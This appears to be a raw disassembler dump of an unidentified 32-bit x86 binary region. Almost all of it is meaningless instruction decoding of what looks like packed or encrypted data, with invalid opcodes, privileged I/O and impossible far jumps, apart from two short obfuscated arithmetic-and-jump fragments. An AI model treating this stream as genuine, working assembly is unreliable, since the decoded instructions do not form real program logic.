  40cff0:	jns    0x40cfa9
  40cff2:	cli    
  40cff3:	fstp   st(4)
  40cff5:	mov    bl,BYTE PTR [ecx]
  40cff7:	cmp    ah,dh
  40cff9:	add    BYTE PTR [eax-0x7c7a996],bh
  40cfff:	and    DWORD PTR [ecx],0xfffffff6
  40d002:	(bad)  
  40d003:	xor    edx,edx
  40d005:	imul   esp,DWORD PTR [edi],0xffffffc7
  40d008:	ror    DWORD PTR ds:0xfdd116e8,cl
  40d00e:	mov    esi,0x9d1d073f
  40d013:	sub    al,0x1f
  40d015:	mov    ebp,0xa22dea91
  40d01a:	add    DWORD PTR [eax],edx
  40d01c:	adc    ebx,DWORD PTR [ecx+0x38]
  40d01f:	(bad)  
  40d020:	sub    BYTE PTR [edi],ah
  40d022:	pop    ds
  40d023:	lock dec ebp
  40d025:	lahf   
  40d026:	mov    DWORD PTR [eax+edi*2],eax
  40d029:	cmp    ebp,DWORD PTR [ebp+0x57]
  40d02c:	ret    0xe11b
  40d02f:	adc    ebp,DWORD PTR [edx-0x68]
  40d032:	inc    ecx
  40d033:	sub    eax,0x664c0756
  40d038:	jl     0x40cfff
  40d03a:	inc    esp
  40d03b:	js     0x40d0aa
  40d03d:	loop   0x40cfef
  40d03f:	mov    ecx,0x46a671c8
  40d044:	cdq    
  40d045:	adc    BYTE PTR [edx],dl
  40d047:	rcr    BYTE PTR ds:0x508b53cd,0xb2
  40d04e:	addr16 data16 jbe 0x40d067
  40d052:	adc    eax,0x748a297c
  40d057:	js     0x40d035
  40d059:	nop
  40d05a:	dec    eax
  40d05b:	adc    bl,BYTE PTR [esi+0x3]
  40d05e:	cmc    
  40d05f:	add    ch,BYTE PTR [eax-0x21]
  40d062:	icebp  
  40d063:	jno    0x40d097
  40d065:	push   esi
  40d066:	add    al,BYTE PTR [ebx-0x7eb9133d]
  40d06c:	mov    dl,0x24
  40d06e:	xchg   BYTE PTR [esi+0x6],bl
  40d071:	repz aaa 
  40d073:	adc    al,ah
  40d075:	ins    DWORD PTR es:[edi],dx
  40d076:	and    al,0xcb
  40d078:	inc    edi
  40d079:	push   cs
  40d07a:	ins    DWORD PTR es:[edi],dx
  40d07b:	jl     0x40d060
  40d07d:	ss je  0x40d0e6
  40d080:	mov    WORD PTR [ebx-0x23],?
  40d083:	retf   0x2e88
  40d086:	std    
  40d087:	ret    
  40d088:	mov    eax,ss
  40d08a:	inc    esp
  40d08b:	dec    ebx
  40d08c:	sub    al,0x2d
  40d08e:	(bad)  
  40d08f:	jecxz  0x40d10a
  40d091:	int    0xda
  40d093:	addr16 (bad) 
  40d095:	mov    bl,0xba
  40d097:	xchg   edi,eax
  40d098:	in     eax,dx
  40d099:	inc    edi
  40d09a:	int    0x33
  40d09c:	mov    edx,0x6fd4f064
  40d0a1:	mov    edi,0xaa39ece4
  40d0a6:	bound  edx,QWORD PTR [edx]
  40d0a8:	fnstsw WORD PTR [ebx]
  40d0aa:	ss loopne 0x40d0c9
  40d0ad:	int    0xe4
  40d0af:	imul   ecx,ecx,0x8cb66922
  40d0b5:	fadd   QWORD PTR [ecx+0x5b]
  40d0b8:	shr    bh,cl
  40d0ba:	dec    ebx
  40d0bb:	adc    al,0x88
  40d0bd:	xchg   edi,eax
  40d0be:	jne    0x40d13c
  40d0c0:	and    ebp,eax
  40d0c2:	outs   dx,BYTE PTR ds:[esi]
  40d0c3:	jbe    0x40c12f
  40d0c9:	mov    edx,DWORD PTR [ebp-0xc]
  40d0cc:	mov    edi,DWORD PTR [ebp-0x24]
  40d0cf:	xor    edx,eax
  40d0d1:	add    edx,ecx
  40d0d3:	imul   edx,edi
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	les    ecx,FWORD PTR [edi-0x68]
  40d0f0:	in     eax,dx
  40d0f1:	fild   QWORD PTR [edx-0x608f8f63]
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d0b9
  40d0fb:	in     al,0xae
  40d0fd:	mov    edi,0x5b66d57
  40d102:	cmp    al,0x87
  40d104:	dec    esp
  40d105:	adc    DWORD PTR [ebx],0xffffff94
  40d108:	inc    esi
  40d109:	(bad)  
  40d10a:	fcmovb st,st(1)
  40d10c:	pop    ebx
  40d10d:	mov    DWORD PTR [ebx],edi
  40d10f:	arpl   WORD PTR [esi-0x59],bx
  40d112:	call   0x64a9878c
  40d117:	xchg   edx,eax
  40d118:	mov    dh,ah
  40d11a:	jge    0x40d14f
  40d11c:	or     eax,0x3cbb31b6
  40d121:	cmp    al,0x6f
  40d123:	sub    DWORD PTR [ebp+0x58],edx
  40d126:	aaa    
  40d127:	add    bl,dh
  40d129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d12a:	inc    edi
  40d12b:	cld    
  40d12c:	scas   al,BYTE PTR es:[edi]
  40d12d:	std    
  40d12e:	loopne 0x40d171
  40d130:	add    edx,DWORD PTR [edi]
  40d132:	sbb    BYTE PTR [bp+di+0x2fd2],cl
  40d137:	daa    
  40d138:	adc    al,0x4e
  40d13a:	inc    edx
  40d13b:	sub    eax,0xcfa0199b
  40d140:	rcr    DWORD PTR [edx+0x67],0x30
  40d144:	imul   esp,DWORD PTR [edi+0x108b5b13],0xae951107
  40d14e:	cmp    esp,DWORD PTR [ebx-0x1d]
  40d151:	fcom   DWORD PTR [edx+0x38db9d8d]
  40d157:	adc    al,0x6
  40d159:	cmc    
  40d15a:	xchg   DWORD PTR [edi-0x59],eax
  40d15d:	xlat   BYTE PTR ds:[ebx]
  40d15e:	jo     0x40d0f3
  40d160:	cmp    edx,esi
  40d162:	pop    eax
  40d163:	inc    eax
  40d164:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d165:	inc    ebp
  40d166:	dec    edx
  40d167:	aam    0x2d
  40d169:	and    eax,0xe27fb76
  40d16e:	push   edx
  40d16f:	xlat   BYTE PTR ds:[ebx]
  40d170:	xor    DWORD PTR [ecx+0x232bac10],eax
  40d176:	test   BYTE PTR [esp+eax*1-0x22ba9000],ch
  40d17d:	int    0x3d
  40d17f:	sbb    dh,al
  40d181:	jp     0x40d13e
  40d183:	out    dx,al
  40d184:	jae    0x40d1a5
  40d186:	xchg   edi,eax
  40d187:	leave  
  40d188:	xchg   esi,eax
  40d189:	ja     0x40d17a
  40d18b:	js     0x40d1cc
  40d18d:	push   ebx
  40d18e:	fcmovbe st,st(0)
  40d190:	loop   0x40d192
  40d192:	xlat   BYTE PTR ds:[ebx]
  40d193:	jnp    0x40d1d4
  40d195:	cmp    eax,DWORD PTR [esi+ebx*1-0x22]
  40d199:	stc    
  40d19a:	enter  0xbdb8,0xb8
  40d19e:	push   esp
  40d19f:	push   eax
  40d1a0:	xor    bl,BYTE PTR [eax+0x7ca49c78]
  40d1a6:	add    BYTE PTR [edx-0x72399567],0x44
  40d1ad:	fld1   
  40d1af:	adc    al,0x1c
  40d1b1:	jecxz  0x40d1eb
  40d1b3:	push   ecx
  40d1b4:	dec    esi
  40d1b5:	cdq    
  40d1b6:	lods   eax,DWORD PTR ds:[esi]
  40d1b7:	and    ch,BYTE PTR es:0xafa42ff3
  40d1be:	imul   ebx,ebp,0x20cb96dc
  40d1c4:	or     DWORD PTR [edx],edi
  40d1c6:	cli    
  40d1c7:	xchg   edi,eax
  40d1c8:	pop    ebx
  40d1c9:	(bad)  
  40d1ca:	mov    esi,0xee6c3a6a
  40d1cf:	vpunpckhwd xmm6,xmm4,XMMWORD PTR [ecx-0x50fb9f94]
  40d1d7:	(bad)  
  40d1d8:	sti    
  40d1d9:	dec    ebx
  40d1da:	inc    ebx
  40d1db:	repnz shl BYTE PTR [edi-0x58],cl
  40d1df:	mov    WORD PTR [edx-0xc],fs
  40d1e2:	outs   dx,DWORD PTR ds:[esi]
  40d1e3:	jle    0x40d1ed
  40d1e5:	les    eax,FWORD PTR [ebx+0x5c]
  40d1e8:	jbe    0x40d198
  40d1ea:	call   0xfefe:0xe68a20ac
  40d1f1:	xchg   DWORD PTR [edx-0x8623ed1],edi
  40d1f7:	sub    eax,0xb7ec3b50
  40d1fc:	mov    bh,bl
  40d1fe:	sbb    DWORD PTR [ebx+0x7e26724f],ebx
  40d204:	dec    edx
  40d205:	fist   DWORD PTR [ebp-0x4d86f934]
  40d20b:	call   0x4faf:0x3a45ace0
  40d212:	ins    DWORD PTR es:[edi],dx
  40d213:	ror    esp,0xea
  40d216:	outs   dx,BYTE PTR ds:[esi]
  40d217:	push   edi
  40d218:	cdq    
  40d219:	jecxz  0x40d267
  40d21b:	iret   
  40d21c:	sub    al,0xa4
  40d21e:	sti    
  40d21f:	xchg   ebp,eax
  40d220:	push   0x5ee87d69
  40d225:	jo     0x40d1c7
  40d227:	rol    dl,0x25
  40d22a:	sub    al,0xd9
  40d22c:	fwait
  40d22d:	mov    cl,0x60
  40d22f:	jl     0x40d1c8
  40d231:	jmp    0xa102f697
  40d236:	stos   BYTE PTR es:[edi],al
  40d237:	es mov esp,0x80e60cf7
  40d23d:	add    eax,0x9d836a49
  40d242:	xchg   ebp,eax
  40d243:	sti    
  40d244:	push   edi
  40d245:	aam    0x5e
  40d247:	mov    ah,0x13
  40d249:	sub    eax,0xf2756f6
  40d24e:	in     al,0x60
  40d250:	out    0x50,eax
  40d252:	in     al,0xe9
  40d254:	fadd   DWORD PTR [eax+0x69]
  40d257:	pushf  
  40d258:	pop    edx
  40d259:	data16 xor al,0x6d
  40d25c:	enter  0xbd85,0xd8
  40d260:	sbb    DWORD PTR [ecx-0x36],esi
  40d263:	leave  
  40d264:	mov    ebp,0x1634dadd
  40d269:	rcr    ebx,1
  40d26b:	fistp  DWORD PTR [eax+0x6f9834f8]
  40d271:	stc    
  40d272:	adc    eax,0x1e926ca4
  40d277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d278:	dec    ebx
  40d279:	sub    DWORD PTR [ebx],ecx
  40d27b:	jmp    0x47a0:0x8a515545
  40d282:	pop    edi
  40d283:	(bad)  
  40d284:	sub    BYTE PTR [ecx-0x1ad263ef],ah
  40d28a:	inc    edx
  40d28b:	and    al,0x9f
  40d28d:	jmp    0x40d304
  40d28f:	xor    BYTE PTR [edx],bl
  40d291:	(bad)  
  40d292:	outs   dx,DWORD PTR ds:[esi]
  40d293:	retf   0xd6fa
  40d296:	fsub   DWORD PTR [ecx+0x5f16b447]
  40d29c:	add    eax,0xd40613d4
  40d2a1:	inc    edx
  40d2a2:	jecxz  0x40d253
  40d2a4:	adc    eax,0xba62d606
  40d2a9:	data16 sbb BYTE PTR [ecx-0x39],ah
  40d2ad:	hlt    
  40d2ae:	stc    
  40d2af:	test   BYTE PTR ds:0xde9cd697,al
  40d2b5:	push   0xe
  40d2b7:	int    0xf0
  40d2b9:	mov    dl,0xb
  40d2bb:	data16 sbb cl,BYTE PTR [ebp-0x6c02bbb]
  40d2c2:	loop   0x40d2df
  40d2c4:	pop    esi
  40d2c5:	fcmovnb st,st(6)
  40d2c7:	nop
  40d2c8:	xor    BYTE PTR [eax+0xe],0x58
  40d2cc:	dec    ebx
  40d2cd:	aam    0x2b
  40d2cf:	cld    
  40d2d0:	add    eax,ebp
  40d2d2:	inc    eax
  40d2d3:	jg     0x40d257
  40d2d5:	enter  0xe38a,0xe3
  40d2d9:	shr    BYTE PTR [eax+0x49b051bc],0x8f
  40d2e0:	or     DWORD PTR [ebp+0x78],edi
  40d2e3:	dec    ecx
  40d2e4:	sub    DWORD PTR [ecx-0xb],ebp
  40d2e7:	test   eax,0x3f6bcbfa
  40d2ec:	jne    0x40d28c
  40d2ee:	fbstp  TBYTE PTR [eax-0x3b]
  40d2f1:	js     0x40d28b
  40d2f3:	dec    edx
  40d2f4:	mov    cl,0xde
  40d2f6:	add    ah,BYTE PTR [ecx-0x41]
  40d2f9:	sbb    BYTE PTR [ecx],cl
  40d2fb:	sbb    ebx,DWORD PTR [eax+0x3520696c]
  40d301:	daa    
  40d302:	fidivr WORD PTR [ebx]
  40d304:	loope  0x40d2d0
  40d306:	lods   eax,DWORD PTR ds:[esi]
  40d307:	out    0x6c,al
  40d309:	inc    eax
  40d30a:	jle    0x40d2e9
  40d30c:	push   ebp
  40d30d:	dec    esp
  40d30e:	inc    esi
  40d30f:	push   eax
  40d310:	adc    edi,DWORD PTR [edi+0x56]
  40d313:	or     DWORD PTR [ecx],esp
  40d315:	aam    0xd4
  40d317:	stos   BYTE PTR es:[edi],al
  40d318:	xchg   ebx,eax
  40d319:	repnz xlat BYTE PTR ds:[ebx]
  40d31b:	ins    DWORD PTR es:[edi],dx
  40d31c:	cmp    eax,0x8fb080a1
  40d321:	jno    0x40d366
  40d323:	ret    0x6456
  40d326:	(bad)  
  40d327:	sahf   
  40d328:	xchg   ebp,eax
  40d329:	in     eax,dx
  40d32a:	hlt    
  40d32b:	or     edi,edi
  40d32d:	jnp    0x40d2f3
  40d32f:	rol    DWORD PTR [ebx+0x73],1
  40d332:	inc    edx
  40d333:	das    
  40d334:	cmp    al,0x58
  40d336:	lahf   
  40d337:	cmp    BYTE PTR [ecx+eiz*4+0xb],cl
  40d33b:	inc    edx
  40d33c:	es adc al,0x92
  40d33f:	hlt    
  40d340:	cmp    DWORD PTR [esi+0x65e4ce4a],esp
  40d346:	xor    ah,BYTE PTR [esi]
  40d348:	dec    esp
  40d349:	and    cl,bh
  40d34b:	sbb    DWORD PTR [esi-0x58],0x6127f4f6
  40d352:	push   esp
  40d353:	fsub   st(5),st
  40d355:	mov    ah,0x86
  40d357:	sbb    al,BYTE PTR [ebp-0x15a2c9d7]
  40d35d:	rol    BYTE PTR [edi+0x5a4f6918],1
  40d363:	xor    al,0x13
  40d365:	jne    0x40d395
  40d367:	(bad)  
  40d368:	sbb    DWORD PTR [ecx],ebp
  40d36a:	push   ss
  40d36b:	aaa    
  40d36c:	push   ebx
  40d36d:	arpl   WORD PTR [ebx-0x68779a03],bx
  40d373:	js     0x40d304
  40d375:	stos   DWORD PTR es:[edi],eax
  40d376:	mov    dh,0x63
  40d378:	mov    eax,0xdff63441
  40d37d:	pop    eax
  40d37e:	inc    esp
  40d37f:	mov    ebp,0x962fa37a
  40d384:	loopne 0x40d366
  40d386:	push   edi
  40d387:	push   cs
  40d388:	add    ah,BYTE PTR [edx+ebp*4+0x79]
  40d38c:	stos   DWORD PTR es:[edi],eax
  40d38d:	aad    0xcb
  40d38f:	dec    edx
  40d390:	push   esi
  40d391:	sub    eax,0xa45d74bb
  40d396:	ret    
  40d397:	push   cs
  40d398:	clc    
  40d399:	jmp    0x59e972bd
  40d39e:	fisub  WORD PTR ds:0x1f43e971
  40d3a4:	lea    esi,[edx]
  40d3a6:	xor    eax,0x234e50f9
  40d3ab:	shl    dl,0x5d
  40d3ae:	in     eax,0xa8
  40d3b0:	(bad)  ds:0x19bc58c3
  40d3b6:	pop    esi
  40d3b7:	lods   eax,DWORD PTR ds:[esi]
  40d3b8:	xor    eax,0xa51e1c40
  40d3bd:	sbb    al,0xf4
  40d3bf:	out    0x74,eax
  40d3c1:	leave  
  40d3c2:	add    eax,0xb24ce165
  40d3c7:	fs and dh,ah
  40d3ca:	hlt    
  40d3cb:	ret    0x8c9f
  40d3ce:	add    eax,0xca809634
  40d3d3:	js     0x40d406
  40d3d5:	mov    ch,0xe3
  40d3d7:	push   eax
  40d3d8:	lock mov al,0xd3
  40d3db:	xchg   ebx,eax
  40d3dc:	stos   DWORD PTR es:[edi],eax
  40d3dd:	mov    ds:0xe15742ab,al
  40d3e2:	adc    BYTE PTR [ecx],dh
  40d3e4:	fist   DWORD PTR [edi+0x25]
  40d3e7:	or     dh,BYTE PTR [esi-0x72]
  40d3ea:	add    eax,0x9ebb86ea
  40d3ef:	retf   
  40d3f0:	rcl    BYTE PTR [esi-0x76],0xd
  40d3f4:	sar    edx,1
  40d3f6:	je     0x40d380
  40d3f8:	jne    0x40d3dc
  40d3fa:	sub    bl,dl
  40d3fc:	sbb    dl,bl
  40d3fe:	pop    ebx
  40d3ff:	test   BYTE PTR [ebx+0x19],ah
  40d402:	in     eax,0x97
  40d404:	idiv   DWORD PTR [ebx]
  40d406:	fstp   DWORD PTR [edx+0x72]
  40d409:	std    
  40d40a:	fdiv   DWORD PTR ds:0x749da172
  40d410:	inc    ebx
  40d411:	cmp    eax,0xdd3856cf
  40d416:	sub    eax,0x7a2049d4
  40d41b:	ins    BYTE PTR es:[edi],dx
  40d41c:	cdq    
  40d41d:	fs push ebx
  40d41f:	and    BYTE PTR [edx-0x28],bl
  40d422:	cmp    BYTE PTR [esi-0x4a],cl
  40d425:	bound  esp,QWORD PTR [eax+edx*2]
  40d428:	cmp    eax,0x66c612e8
  40d42d:	fstp   TBYTE PTR [ebx]
  40d42f:	or     eax,0x419e8d6e
  40d434:	ret    
  40d435:	pusha  
  40d436:	push   0xf51920ad
  40d43b:	add    al,0x19
  40d43d:	vpcmpgtb ymm4,ymm3,YMMWORD PTR [ecx+0x74fe230e]
  40d445:	adc    cl,BYTE PTR [eax+edx*4+0x6]
  40d449:	rcr    ch,cl
  40d44b:	popf   
  40d44c:	jae    0x40d499
  40d44e:	mov    ecx,0x1378fe74
  40d453:	call   0xbc013bf3
  40d458:	mov    BYTE PTR [ebx+0x41323103],dl
  40d45e:	cmp    al,0x7f
  40d460:	push   ss
  40d461:	push   cs
  40d462:	xor    BYTE PTR [ecx-0x11cf9cde],bh
  40d468:	(bad)
  40d46b:	mov    cl,0xd8
  40d46d:	cli    
  40d46e:	inc    DWORD PTR [edi]
  40d470:	out    0x0,al
  40d472:	xchg   DWORD PTR [ebp-0x722983e],eax
  40d478:	dec    esp
  40d479:	sti    
  40d47a:	ficomp WORD PTR [edx+edx*1-0x35]
  40d47e:	dec    edi
  40d47f:	sbb    eax,0x7f355bfd
  40d484:	fcom   DWORD PTR [edx-0x745e6886]
  40d48a:	xchg   DWORD PTR [ebp+0x1],esp
  40d48d:	jmp    0x495c:0xec352135
  40d494:	lods   eax,DWORD PTR ds:[esi]
  40d495:	dec    dh
  40d497:	mov    dh,0xdb
  40d499:	pop    edx
  40d49a:	fisttp WORD PTR [ebx-0x6b720783]
  40d4a0:	cmp    bl,BYTE PTR [edx+esi*2+0x55890032]
  40d4a7:	clc    
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0xd3d3:0xb81a1d63
  40d4c6:	xchg   edx,eax
  40d4c7:	cwde   
  40d4c8:	cli    
  40d4c9:	leave  
  40d4ca:	cdq    
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d4ef
  40d4d2:	mov    ebx,ds
  40d4d4:	fwait
  40d4d5:	outs   dx,DWORD PTR ds:[esi]
  40d4d6:	sahf   
  40d4d7:	push   ecx
  40d4d8:	cmp    eax,0x6f1bff39
  40d4dd:	addr16 push ds
  40d4df:	daa    
  40d4e0:	sbb    DWORD PTR [edx+0xe2cadc1],ebx
  40d4e6:	fwait
  40d4e7:	aam    0x4f
  40d4e9:	out    0x16,eax
  40d4eb:	stc    
  40d4ec:	out    0xc7,eax
  40d4ee:	fwait
  40d4ef:	bound  esi,QWORD PTR [ebx-0x56]
  40d4f2:	adc    al,0x82
  40d4f4:	scas   al,BYTE PTR es:[edi]
  40d4f5:	stc    
  40d4f6:	xor    BYTE PTR [ebp+eax*2+0x51],ch
  40d4fa:	mov    ds:0x5198f727,eax
  40d4ff:	cmp    eax,0x809d7c2c
  40d504:	test   DWORD PTR [edx],ebp
  40d506:	lock psraw mm4,QWORD PTR [ecx+ecx*2-0x62]
  40d50c:	xchg   ecx,eax
  40d50d:	sub    al,0xcc
  40d510:	pop    ss
  40d511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d513:	pop    edx
  40d514:	fs xor bl,ch
  40d517:	in     al,dx
  40d518:	iret   
  40d519:	test   bl,cl
  40d51b:	jmp    0xfe15c1aa
  40d520:	inc    ecx
  40d521:	out    0xf0,al
  40d523:	jne    0x40d4fc
  40d525:	jge    0x40d531
  40d527:	nop
  40d528:	aam    0x7
  40d52a:	or     cl,BYTE PTR [ebp+0x28807709]
  40d530:	popf   
  40d531:	pop    ds
  40d532:	fwait
  40d533:	jne    0x40d52c
  40d535:	retf   0x27c7
  40d538:	mov    ecx,0x91fde6be
  40d53d:	push   esi
  40d53e:	mov    al,ds:0x9dd2f293
  40d543:	(bad)  
  40d544:	fwait
  40d545:	pop    ss
  40d546:	jmp    0x573c:0x858091a7
  40d54d:	push   es
  40d54e:	push   eax
  40d54f:	adc    eax,0x8ea38209
  40d554:	xor    al,BYTE PTR [ebx+0xf569ef0]
  40d55a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d55b:	fisub  WORD PTR [edi-0x2f0b0377]
  40d561:	inc    dl
  40d563:	dec    edi
  40d564:	or     bh,BYTE PTR [edx+0x23]
  40d567:	retf   0xdb7f
  40d56a:	aaa    
  40d56b:	mov    ecx,0xad7da09a
  40d570:	aad    0xaf
  40d572:	imul   esi,edx,0xffffffbc
  40d575:	(bad)  
  40d576:	repnz mov dh,0x8f
  40d579:	sbb    eax,0x689b5890
  40d57e:	test   DWORD PTR [edx-0x79],edi
  40d581:	push   ss
  40d582:	shr    DWORD PTR [esi-0x50],0x7b
  40d586:	(bad)  
  40d587:	mov    ecx,esp
  40d589:	mov    ds:0x8e76af4d,al
  40d58e:	in     eax,0x19
  40d590:	je     0x40d5b0
  40d592:	and    esp,DWORD PTR [ebp+edi*1+0x12111ff3]
  40d599:	mov    ch,0xde
  40d59b:	cmp    bh,BYTE PTR [eax+edx*4]
  40d59e:	test   DWORD PTR [ebx+0x7f],0x77355a47
  40d5a5:	call   FWORD PTR [ebp+0x2884b072]
  40d5ab:	rcr    dh,1
  40d5ad:	mov    BYTE PTR [edi+0x7a],dh
  40d5b0:	clc    
  40d5b1:	popf   
  40d5b2:	repz scas al,BYTE PTR es:[edi]
  40d5b4:	xlat   BYTE PTR ds:[ebx]
  40d5b5:	mov    eax,0x552467a0
  40d5ba:	sahf   
  40d5bb:	xchg   ebp,eax
  40d5bc:	mov    WORD PTR [ecx-0x21],es
  40d5bf:	retf   
  40d5c0:	push   cx
  40d5c2:	ret    
  40d5c3:	test   BYTE PTR [ecx+0x55e79e35],0x80
  40d5ca:	shl    DWORD PTR [ecx],0x61
  40d5cd:	jnp    0x40d588
  40d5cf:	xchg   esp,eax
  40d5d0:	push   0xd12f45ef
  40d5d5:	in     al,0x8d
  40d5d7:	xor    al,dh
  40d5d9:	sar    edi,0x20
  40d5dc:	popa   
  40d5dd:	or     ebp,esp
  40d5df:	dec    edi
  40d5e0:	inc    esp
  40d5e1:	xor    DWORD PTR ds:0x800a89e1,ebp
  40d5e7:	cmp    eax,0x7c2ad958
  40d5ec:	das    
  40d5ed:	es xor al,0xd8
  40d5f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5f1:	not    DWORD PTR [edi]
  40d5f3:	add    ch,dl
  40d5f5:	cmp    eax,0x5d825f22
  40d5fa:	mov    ebx,0x5eb5ff56
  40d5ff:	cmp    bh,bh
  40d601:	pop    edx
  40d602:	fs inc esi
  40d604:	es jne 0x40d631
  40d607:	xchg   esi,eax
  40d608:	aad    0xe6
  40d60a:	dec    esi
  40d60b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d60c:	mov    al,ds:0x22d94cc4
  40d611:	lea    esi,[eax-0x18]
  40d614:	fwait
  40d615:	mov    ebp,0x4cfaa2b8
  40d61a:	ss addr16 pop esp
  40d61d:	cmp    eax,0xfce5365d
  40d622:	ins    BYTE PTR es:[edi],dx
  40d623:	jl     0x40d68e
  40d625:	lods   eax,DWORD PTR ds:[esi]
  40d626:	out    0x85,eax
  40d628:	mov    ?,WORD PTR [ebx+0x5b]
  40d62b:	fnsave [edx-0x6d]
  40d62e:	mov    ecx,0xf1e1317f
  40d633:	sbb    DWORD PTR [edi-0x64],ebx
  40d636:	xor    bh,bl
  40d638:	push   ebp
  40d639:	fidiv  DWORD PTR [esi+0x701c93ce]
  40d63f:	jne    0x40d5d9
  40d641:	push   edx
  40d642:	push   ebp
  40d643:	jo     0x40d642
  40d645:	push   ds
  40d646:	xor    DWORD PTR ds:0x91a8bb0f,edi
  40d64c:	jl     0x40d681
  40d64e:	fs in  eax,dx
  40d650:	or     al,0x4d
  40d652:	sub    DWORD PTR [edi+0x9142ea9],ecx
  40d658:	mov    dl,0xb4
  40d65a:	push   eax
  40d65b:	push   ebp
  40d65c:	inc    esi
  40d65d:	xlat   BYTE PTR ds:[ebx]
  40d65e:	jo     0x40d6c0
  40d660:	aaa    
  40d661:	sbb    bh,BYTE PTR [eax]
  40d663:	add    esi,DWORD PTR [esp+ebp*2+0x24]
  40d667:	int    0x0
  40d669:	mov    BYTE PTR [edx+edi*1],ah
  40d66c:	push   esi
  40d66d:	int    0xd7
  40d66f:	fnstcw WORD PTR [ebx+0x9c0d088]
  40d675:	mov    dl,0xe5
  40d677:	mov    ecx,DWORD PTR [edi-0x1d]
  40d67a:	cld    
  40d67b:	out    dx,al
  40d67c:	cdq    
  40d67d:	ins    DWORD PTR es:[edi],dx
  40d67e:	push   edi
  40d67f:	adc    eax,0xb2690e7b
  40d684:	pop    esi
  40d685:	adc    al,0xac
  40d687:	enter  0x772d,0xd3
  40d68b:	xchg   DWORD PTR [esp+esi*2+0x248847fa],ecx
  40d692:	push   ebp
  40d693:	ror    bl,1
  40d695:	je     0x40d692
  40d697:	add    DWORD PTR [eax+ebp*4-0x32d91498],edi
  40d69e:	pop    es
  40d69f:	xor    eax,0x7914092f
  40d6a4:	inc    esi
  40d6a5:	push   es
  40d6a6:	fnstsw WORD PTR [ebp-0x4715a3fa]
  40d6ac:	pop    ss
  40d6ad:	retf   
  40d6ae:	push   ecx
  40d6af:	cmp    eax,0x598018
  40d6b4:	in     al,dx
  40d6b5:	lahf   
  40d6b6:	ret    0xe7fd
  40d6b9:	cld    
  40d6ba:	leave  
  40d6bb:	add    BYTE PTR [ebx-0x6d28f3d6],ch
  40d6c1:	cmp    ch,dl
  40d6c3:	ret    
  40d6c4:	mov    al,0x0
  40d6c6:	cmc    
  40d6c7:	bound  edi,QWORD PTR [ebx]
  40d6c9:	xor    dh,BYTE PTR [ecx-0x79623c34]
  40d6cf:	and    DWORD PTR [ecx+0x31],ebp
  40d6d2:	cwde   
  40d6d3:	mov    esp,0x529ea128
  40d6d8:	ja     0x40d749
  40d6da:	and    eax,0x7bce162f
  40d6df:	mov    ecx,?
  40d6e1:	mov    ah,0xac
  40d6e3:	test   ebp,ebp
  40d6e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6e6:	mov    BYTE PTR [eax+0x8f00d18],ch
  40d6ec:	int3   
  40d6ed:	mov    ?,WORD PTR [edx]
  40d6ef:	adc    eax,0x713d1968
  40d6f4:	gs ins DWORD PTR es:[edi],dx
  40d6f6:	mov    ah,0xfd
  40d6f8:	cmp    BYTE PTR [edi-0x70],ah
  40d6fb:	loop   0x40d744
  40d6fd:	scas   eax,DWORD PTR es:[edi]
  40d6fe:	add    BYTE PTR [esi],bh
  40d700:	aad    0x35
  40d702:	mov    dh,0x78
  40d704:	(bad)  
  40d705:	fsubr  QWORD PTR [ebx+0x5f131fcc]
  40d70b:	icebp  
  40d70c:	dec    esi
  40d70d:	ror    DWORD PTR [esi+0x64],0xf9
  40d711:	les    edx,FWORD PTR [ebp+0x3a281051]
  40d717:	pop    eax
  40d718:	icebp  
  40d719:	mov    ebp,0xbd2891b1
  40d71e:	cmp    BYTE PTR [ebx-0x749d47d7],bl
  40d724:	sahf   
  40d725:	sbb    eax,0xfbe6174c
  40d72a:	or     edx,DWORD PTR [ecx-0x4c405d0c]
  40d730:	mov    edi,0xb99870e0
  40d735:	imul   esi,DWORD PTR [esi-0x413b1081],0x54a5cdb4
  40d73f:	aam    0xa4
  40d741:	ds cs inc ebx
  40d744:	push   edx
  40d745:	push   es
  40d746:	mov    bh,0x8d
  40d748:	outs   dx,DWORD PTR ds:[esi]
  40d749:	sti    
  40d74a:	push   cs
  40d74b:	mov    eax,0x9abdd2aa
  40d750:	dec    esi
  40d751:	pop    edx
  40d752:	jecxz  0x40d70e
  40d754:	xchg   edi,eax
  40d755:	push   esp
  40d756:	adc    eax,0x1331cafa
  40d75b:	pcmpgtw mm0,QWORD PTR [edx-0x262b5ef6]
  40d762:	jo     0x40d786
  40d764:	ja     0x40d751
  40d766:	sub    al,0xcb
  40d768:	dec    eax
  40d769:	icebp  
  40d76a:	fmul   QWORD PTR [edx]
  40d76c:	mov    ecx,0xd272cc78
  40d771:	add    eax,0xaff414e
  40d776:	ss (bad) 
  40d778:	pop    esp
  40d779:	scas   al,BYTE PTR es:[edi]
  40d77a:	xchg   BYTE PTR [esp+edi*2],cl
  40d77d:	sbb    BYTE PTR ds:0xd79c9772,ch
  40d783:	jmp    0x64cb:0x514dc7bb
  40d78a:	mov    eax,ds:0x3f9e4f32
  40d78f:	xor    ch,BYTE PTR [eax+esi*2]
